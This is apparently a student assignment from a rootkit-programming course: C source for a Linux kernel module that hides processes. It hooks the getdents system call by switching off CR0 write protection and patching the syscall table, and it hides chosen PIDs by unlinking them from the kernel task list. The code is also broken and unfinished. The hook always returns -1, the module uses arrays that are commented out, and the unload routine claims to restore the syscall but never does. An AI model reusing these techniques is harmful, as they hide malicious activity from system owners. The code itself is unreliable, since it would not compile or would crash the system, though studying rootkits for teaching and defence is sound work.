/*
 * Assignment 02 for the course Rootkit Programming at TUM in WS2014/15.
 * Implemented by Guru Chandrasekhara and Martin Herrmann.
 */
#include <asm/page.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>

#include "sysmap.h"


/* Information for modinfo */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Guru Chandrasekhara, Martin Herrmann");



void **sys_call_table;

asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
static int call_counter = 0;

asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	call_counter++;
	/* nothing else above this line */

	
	
	
	/* nothing else below this line */
	call_counter--;
	return -1;
}


//static int task_count = 0;
static int processes[16] = {-1, -1, -1 , -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1};
static int argcount = 0;

//static struct list_head *old_prev[16];
//static struct list_head *old_next[16];

/* Define module parameters */
module_param_array(processes, int, &argcount, 0000);
MODULE_PARM_DESC(processes, "An array of process ids to hide. Must contain at least one and no more than 16 pids.");

/*
 * Tries hiding a specific process identified by its pid from the user.
 * Returns 0 on success, 1 on failure.
 */
int hide_process(struct task_struct *task, int task_num) {
	struct task_struct *next;
	struct task_struct *prev;

	next = list_entry_rcu((task)->tasks.next, struct task_struct, tasks);	
	prev = list_entry_rcu((task)->tasks.prev, struct task_struct, tasks);	
	
	old_prev[task_num] = (task)->tasks.prev;
	old_next[task_num] = (task)->tasks.next;

	printk(KERN_INFO "Next pid: %d\nPrevious pid: %d\n", next->pid, prev->pid);	
	
	(prev)->tasks.next = old_next[task_num];
	(next)->tasks.prev = old_prev[task_num];
	
	/* if we reach this point it failed for some reason */
	return 1;
}

/*
 * Disable the writing protection for the whole processor.
 */
static void disable_page_protection (void)
{
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (value & 0x00010000)
	{
		value &= ~0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
	}
}

/*
 * Reenable the writing protection for the whole processor.
 */
static void enable_page_protection (void)
{
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (!(value & 0x00010000))
	{
		value |= 0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
    	}
}

int get_tasks (pid_t *pids, struct task_struct **tasks, int size) 
{
	struct task_struct *task;
	int i, n;

	n = 0;
	for_each_process(task) {
		for(i = 0; i < size; i++) {
			if(task->pid == pids[i]) {
				tasks[n] = task;
				printk(KERN_INFO "Found matching task_struct for pid %d.", pids[i]);
				n++;
			}
		}
	}

	/* return the number of tasks in the array */
	return n;
}

/*
 * Function called when loading the kernel module.
 * Prints a welcome-message and replaces the getdents syscall.
 */
int init_module (void)
{
	int i;
	struct task_struct *tasks[16];	

	/* check the number of arguments */
	if(argcount > 16)
	{
		return -E2BIG;
	}		
	if(argcount <= 0)
	{
		return -EINVAL;
	}
	
	printk(KERN_INFO "Loading process-hider LKM...\n");
	
	/* get the pointer to the sys_call_table */
	sys_call_table = (void *) sysmap_sys_call_table;

	/* disable the write protection */
	disable_page_protection();

	/* replace the syscall getdents */
	original_getdents = (void *) sys_call_table[__NR_getdents];
	sys_call_table[__NR_getdents] = (int *) manipulated_getdents;

	/* reenable the write protection */
	enable_page_protection();
	
	//task_count = get_tasks(processes, tasks, 16);
			
	return 0;
}

/*
 * Function called when unloading the kernel module.
 * Prints a goodbye-message and restores the original read() syscall.
 */
void cleanup_module (void)
{
	//struct task_struct *task;
	//for_each_process(task) {
	//	printk(KERN_INFO "%d,", task->pid);
	//}

	while(call_counter > 0) {
		/* sleep for some time */
		// TODO: implement sleep
	}
	
	/* Finally, log the unloading */
	printk(KERN_INFO "Unloading process-hider... bye!\n");
}
